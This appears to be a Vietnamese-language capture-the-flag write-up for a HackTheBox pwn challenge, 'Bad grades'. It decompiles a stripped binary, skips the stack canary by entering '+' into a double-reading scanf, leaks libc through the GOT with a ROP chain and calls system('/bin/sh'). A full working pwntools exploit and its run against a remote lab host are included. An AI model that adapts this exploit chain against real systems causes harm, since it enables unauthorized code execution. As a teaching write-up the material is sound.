---
title: "[HTB] - Execute"
published: 2025-01-30
description: "ROP with canary and stripped file"
image: "../../logo.jpg"
tags:
  - PWN
category: "Wargame"
draft: false
---

# Description

> "You are not interested in studying for school anymore, you only play CTFs and challenges! Your grades fell off a cliff! I will take your laptop away if you continue like this". You need to do something to raise them before your parents ground you forever..
>

# General Information

```bash
alter ^ Sol in ~/HTB/chal/pwn/Bad grades
$ checksec bad_grades
[*] '/home/alter/HTB/chal/pwn/Bad grades/bad_grades'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
alter ^ Sol in ~/HTB/chal/pwn/Bad grades
$ file bad_grades
bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped
```

Một file `stripped`  kèm theo `Full RELRO` và `Canary` . Khá căng những ít ra nó không có `PIE` . Vì file này `stripped` nên ta có thể dùng `IDA` để xác định địa chỉ của từng hàm theo mục đích của ta:

- **main()**

    ```c
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      int v3; // ecx
      int v4; // r8d
      int v5; // r9d
      int v6; // ecx
      int v7; // r8d
      int v8; // r9d
      int v10; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v11; // [rsp+8h] [rbp-8h]

      v11 = __readfsqword(0x28u);
      sub_400EA6(a1, a2, a3);
      printf("Your grades this semester were really ");
      sub_400ACB((unsigned int)"good", (unsigned int)"green", (unsigned int)"deleted", v3, v4, v5);
      sub_400ACB((unsigned int)" BAD!\n", (unsigned int)"red", (unsigned int)"blink", v6, v7, v8);
      printf("\n1. View current grades.\n2. Add new.\n> ");
      __isoc99_scanf("%d", &v10);
      if ( v10 == 1 )
        current_grades();
      if ( v10 != 2 )
      {
        puts("Invalid option!\nExiting..");
        exit(9);
      }
      view();
      return 0LL;
    }
    ```


Mặc dù file nhị phân bị `stripped`, tức là không còn thông tin về tên hàm hoặc biến để phân tích, nhưng IDA vẫn hiển thị hàm `main` nhờ khả năng phân tích hoạt động của chương trình. Trên các hệ thống như Linux, chương trình thường bắt đầu từ hàm `_start`, sau đó gọi đến `__libc_start_main`, và cuối cùng `__libc_start_main` sẽ gọi hàm `main`. Do `__libc_start_main` là một phần của thư viện chuẩn (như `glibc`) và không bị stripped, IDA có thể nhận diện hàm này và lần theo tham số đầu tiên (địa chỉ của `main`) để xác định vị trí của hàm `main`.

:::note[Mở rộng]
The `__libc_start_main()` function shall perform any necessary initialization of the execution environment, call the `*main*` function with appropriate arguments, and handle the return from `main()`. If the `main()` function returns, the return value shall be passed to the `exit()` function.

**Note:** While this specification is intended to be implementation independent, process and library initialization may include:

• performing any necessary security checks if the effective user ID is not the same as the real user ID.
• initialize the threading subsystem.
• registering the `*rtld_fini*` to release resources when this dynamic shared object exits (or is unloaded).
• registering the `*fini*` handler to run at program exit.
• calling the initializer function `(**init*)()`.
• calling `main()` with appropriate arguments.
• calling `exit()` with the return value from `main()`.This list is an example only.

- performing any necessary security checks if the effective user ID is not the same as the real user ID.
- initialize the threading subsystem.
- registering the `*rtld_fini*` to release resources when this dynamic shared object exits (or is unloaded).
- registering the `*fini*` handler to run at program exit.
- calling the initializer function `(**init*)()`.
- calling `main()` with appropriate arguments.
- calling `exit()` with the return value from `main()`.

`__libc_start_main()` is not in the source standard; it is only in the binary standard.

> Ref: [**__libc_start_main**](https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html)
:::

Vì thế dựa vào đây, ta có thể decompile thêm 2 hàm nữa

- **current_grades()**

    ```c
    void __noreturn current_grades()
    {
      int v0; // ecx
      int v1; // r8d
      int v2; // r9d
      int i; // [rsp+Ch] [rbp-24h]
      int v4[6]; // [rsp+10h] [rbp-20h]
      unsigned __int64 v5; // [rsp+28h] [rbp-8h]

      v5 = __readfsqword(0x28u);
      v4[0] = 2;
      v4[1] = 4;
      v4[2] = 1;
      v4[3] = 3;
      v4[4] = 0;
      puts("\nYour grades were: ");
      for ( i = 0; i <= 4; ++i )
        printf("%d\n", (unsigned int)v4[i]);
      printf("\nYou need to try ");
      sub_400ACB((unsigned int)"HARDER", (unsigned int)"magenta", (unsigned int)"underline", v0, v1, v2);
      puts("!");
      exit(34);
    }
    ```

- **view()**

    ```c
    unsigned __int64 __fastcall view(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
    {
      int v7; // [rsp+0h] [rbp-120h] BYREF
      int i; // [rsp+4h] [rbp-11Ch]
      double v9; // [rsp+8h] [rbp-118h]
      double v10[33]; // [rsp+10h] [rbp-110h] BYREF
      unsigned __int64 v11; // [rsp+118h] [rbp-8h]

      v11 = __readfsqword(0x28u);
      v9 = 0.0;
      sub_400ACB((unsigned int)"Number of grades: ", (unsigned int)"cyan", (unsigned int)"bold", a4, a5, a6);
      __isoc99_scanf("%d", &v7);
      for ( i = 0; i < v7; ++i )
      {
        printf("Grade [%d]: ", (unsigned int)(i + 1));
        __isoc99_scanf("%lf", &v10[i]);
        v9 = v10[i] + v9;
      }
      printf("Your new average is: %.2f\n", v9 / (double)v7);
      return __readfsqword(0x28u) ^ v11;
    }
    ```


Như vậy flow của chương trình này sẽ là:

- Chọn options 1 hoặc 2
- Nếu 1 thì run hàm `current_grades` để show điểm (không có gì đặc biệt) → Exit
- Nếu 2 thì run hàm `view` → Cho ta nhập số với độ lớn do ta quyết định → Exit

Điều đặc biệt ở hàm `view` là nó không kiểm tra kĩ dữ liệu mà ta nhập vào, nên vì thế ta có thể gây ra `Buffer Overflow` do ta có thể kiểm soát được độ lớn của đầu vào.

# Bypass canary & leak libc

Vì chương trình yêu nhập số và nó còn có liên quan đến số lần nhập nên mình sẽ tạo 2 functions này để tiện cho việc khai thác về sau:

```python
def hex2float(value):
    try:
        return struct.unpack('>d', bytes.fromhex(hex(value)[2:].rjust(16, '0')))[0]
    except struct.error:
        return 0.0

def send_floats(value):
    for v in value:
        sla(b': ', str(v).encode())
```

- **Tips debug file stripped**

    Do file này bị stripped nên sẽ khá khó để debug nhưng không phải là không có cách, như đã nói ở trên ta có thể dựa vào `__libc_start_main` để xác định hàm `main()` và từ hàm `main()` ta xác định thêm các hàm khác

    ### Find main()

    ```python
    pwndbg> start
    <...>
       0x40071e    push   rsp
       0x40071f    mov    r8, 0x401270                R8 => 0x401270 ◂— repz ret
       0x400726    mov    rcx, 0x401200               RCX => 0x401200 ◂— push r15
       0x40072d    mov    rdi, 0x401108               RDI => 0x401108 ◂— push rbp
       0x400734    call   qword ptr [rip + 0x2018b6]  <__libc_start_main>
    ```

    Ở `0x400734` ta thấy nó call `__libc_start_main` ta sẽ nhảy vào đó để xem như thế nào

    ```python
    pwndbg> si
    <...>
    pwndbg> ni
     ► 0x7ffff7db0e2d <__libc_start_main+109>    jne    __libc_start_main+266       <__libc_start_main+266>

       0x7ffff7db0e33 <__libc_start_main+115>    mov    rdx, r12     RDX => 0x7fffffffdd28 —▸ 0x7fffffffdfbd ◂— 0x6c612f656d6f682f ('/home/al')
       0x7ffff7db0e36 <__libc_start_main+118>    mov    esi, ebp     ESI => 1
       0x7ffff7db0e38 <__libc_start_main+120>    mov    rdi, r13     RDI => 0x401108 ◂— push rbp
       0x7ffff7db0e3b <__libc_start_main+123>    call   __libc_start_call_main      <__libc_start_call_main>
    ```

    Đến đây ta có thể thấy được tại `__libc_start_main+123` nó call `__libc_start_call_main` , điều này thường xảy ra khi chương trình bắt đầu thực hiện quá trình khởi tạo và sau đó chuyển quyền điều khiển đến hàm `main`. Nhìn ở các dòng ở trên ta có thể thấy nó setup các `argument` cần thiết cho việc gọi `__libc_start_call_main` dựa vào đó ta có thể xác định được địa chỉ của main là `0x401108` vì nó được setup trong RDI tương đương argument 1. Ta có thể dựa vào đây

    - **IDA**

        ```c
        // positive sp value has been detected, the output may be wrong!
        void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
        {
          __int64 v3; // rax
          int v4; // esi
          __int64 v5; // [rsp-8h] [rbp-8h] BYREF
          char *retaddr; // [rsp+0h] [rbp+0h] BYREF

          v4 = v5;
          v5 = v3;
          _libc_start_main((int (__fastcall *)(int, char **, char **))main, v4, &retaddr, init, fini, a3, &v5);
          __halt();
        }
        ```


    ### Find view()

    Và rồi tìm các hàm khác thôi (focus vào hàm `view()`)

    ```c
    pwndbg> b*0x401108
    pwndbg> r
    <...>
    pwndbg> ni
    pwndbg>
    2
    <...>
       0x4011a4    cmp    eax, 1                         2 - 1     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
       0x4011a7    je     0x4011b0                    <0x4011b0>

       0x4011a9    cmp    eax, 2                         2 - 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
       0x4011ac  ✔ je     0x4011bc                    <0x4011bc>
        ↓
       0x4011bc    mov    eax, 0                         EAX => 0
     ► 0x4011c1    call   0x400fd5                    <0x400fd5>

       0x4011c6    jmp    0x4011de                    <0x4011de>
        ↓
       0x4011de    mov    eax, 0                       EAX => 0
       0x4011e3    mov    rcx, qword ptr [rbp - 8]
       0x4011e7    xor    rcx, qword ptr fs:[0x28]
       0x4011f0    je     0x4011f7                    <0x4011f7>
    ```

    Vậy địa chỉ của `view()` sẽ là `0x400fd5`


Khi debug thì ta sẽ test xem nó overwrite canary ở index thứ mấy bằng GDB, ở đây để cho lẹ thì mình đã tìm thấy nó ở index thứ `33` (tính từ 0 → 33). Nhưng để bypass canary thì ta không được để cho nó overwrite tại lần nhập thứ `34` . Dựa vào [**đây**](https://www.gnu.org/software/libc/manual/html_node/Parsing-of-Integers.html) ta thấy:

> If the string is empty, contains only whitespace, or does not contain an initial substring that has the expected syntax for an integer in the specified base, no conversion is performed.
>

Nên khi ta nhập kí tự nào đó khác số ở đây ta sẽ chọn nhập `+ hoặc -` vì 2 kí tự đó cũng được nằm trong phần chấp nhận được. Nên nếu ta chỉ đơn giản input `+` và không có số theo sau thì nó sẽ không write gì cả, và bên cạnh đó nó được chấp nhận. Còn một cách giải thích khác là dựa vào:

```c
__isoc99_scanf("%lf", &v10[i]);
```

Vì ở đây nó dùng `%lf` nên khi ta nhập một kí tự nào đó nằm ngoài khả năng xử lý của nó thì nó sẽ không làm gì cả.

Nhiêu đó thôi ta cũng đủ để bypass canary, và tiếp đến là tận dụng `GOT` để leak `libc` :

```python
# Leak libc address
sla(b'> ', b'2')
sla(b': ', b'39')
send_floats(
	[1.0] * 33 + [
    '+', # Canary
    5.0, # Saved rbp
    # hex2float(ret),
    hex2float(pop_rdi), # Saved rip
    hex2float(exe.got.puts),
    hex2float(exe.plt.puts),
    hex2float(main_addr)]
    )

rl()
leak = u64(rl()[:-1] + b"\0\0")
libc.address = leak - libc.sym.puts
info(f'Leak: {hex(leak)}')
info(f'Libc base: {hex(libc.address)}')
sleep(0.5)
```

# Get shell

Khi đã có được `libc base` và `canary` rồi thì việc get shell là một chuyện đơn giản

```python
# Get shell
sla(b'> ', b'2')
sla(b': ', b'39')
send_floats(
	[0.0] * 33 + [
    '+', # Canary
    5.0, # Saved rbp
    hex2float(ret), # Saved rip
    hex2float(pop_rdi),
    hex2float(next(libc.search(b'/bin/sh'))),
    hex2float(libc.sym.system)]
    )
```

- **Full exploit**

    ```python
    #!/usr/bin/python3
    from pwncus import *
    from time import sleep
    import struct

    # context.log_level = 'debug'
    exe = context.binary = ELF('./bad_grades_patched', checksec=False)
    libc = ELF('libc.so.6', checksec=False)

    def GDB(): gdb.attach(p, gdbscript='''

    c
    ''') if not args.REMOTE else None

    if args.REMOTE:
        con = sys.argv[1:]
        p = remote(con[0], int(con[1]))
    else:
        p = process(argv=[exe.path], aslr=False)
    set_p(p)
    if args.GDB: GDB(); input()

    # ===========================================================
    #                          EXPLOIT
    # ===========================================================

    def hex2float(value):
        try:
            return struct.unpack('>d', bytes.fromhex(hex(value)[2:].rjust(16, '0')))[0]
        except struct.error:
            return 0.0

    def send_floats(value):
        for v in value:
            sla(b': ', str(v).encode())

    def exploit():
        main_addr = 0x401108
        view_addr = 0x400fd5
        current_grade_addr = 0x4011b0
        pop_rdi = 0x0401263
        ret = 0x400666

        # Leak libc address
        sla(b'> ', b'2')
        sla(b': ', b'39')
        send_floats(
            [1.0] * 33 + [
            '+',
            5.0,
            # hex2float(ret),
            hex2float(pop_rdi),
            hex2float(exe.got.puts),
            hex2float(exe.plt.puts),
            hex2float(main_addr)]
        )

        rl()
        leak = fixleak(rl()[:-1])
        libc.address = leak - libc.sym.puts
        info(f'Leak: {hex(leak)}')
        info(f'Libc base: {hex(libc.address)}')
        sleep(0.5)

        # Get shell
        sla(b'> ', b'2')
        sla(b': ', b'39')
        send_floats(
            [0.0] * 33 + [
            '+',
            5.0,
            hex2float(ret),
            hex2float(pop_rdi),
            hex2float(next(libc.search(b'/bin/sh'))),
            hex2float(libc.sym.system)]
        )

        interactive()

    if __name__ == '__main__':
        exploit()
    ```

    ```bash
    alter ^ Sol in ~/HTB/chal/pwn/Bad grades
    $ ./xpl.py REMOTE 94.237.54.116 40708
    [+] Opening connection to 94.237.54.116 on port 40708: Done
    [*] Leak: 0x7febcdd4aaa0
    [*] Libc base: 0x7febcdcca000
    [*] Switching to interactive mode
    Your new average is: 9320600893962.79
    $ cat flag.txt
    HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
    ```
